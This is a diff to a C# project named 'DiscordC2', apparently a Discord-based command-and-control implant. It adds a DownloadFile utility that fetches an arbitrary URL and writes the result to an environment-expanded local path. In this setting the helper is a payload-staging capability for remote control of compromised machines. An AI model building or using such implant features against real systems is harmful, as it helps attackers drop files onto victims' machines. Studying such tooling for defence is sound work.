@@ -7,6 +7,7 @@ using System.Dynamic;
 using DiscordC2.Init;
 using System.Security.Cryptography;
 using Microsoft.Extensions.DependencyInjection;
+using System.Net;
 
 namespace DiscordC2.Common;
 public static class Utils {
@@ -93,5 +94,28 @@ public static class Utils {
         
         return Convert.ToHexString(hashBytes);
 
+    }
+
+    public static string DownloadFile(string url, string path) {
+
+        using (var client = new HttpClient())
+        {
+            var filename = Environment.ExpandEnvironmentVariables(path);
+
+            try {
+                var getRequest = client.GetAsync(url).Result;
+                var readFile = getRequest.Content.ReadAsStreamAsync().Result;
+                readFile.CopyTo(File.Create(filename));
+
+                if (File.Exists(filename))
+                    return "success";
+
+            } catch (InvalidOperationException e) {
+                return "URL invalid";
+            }
+
+        }
+        
+        return "error";
     }
 }
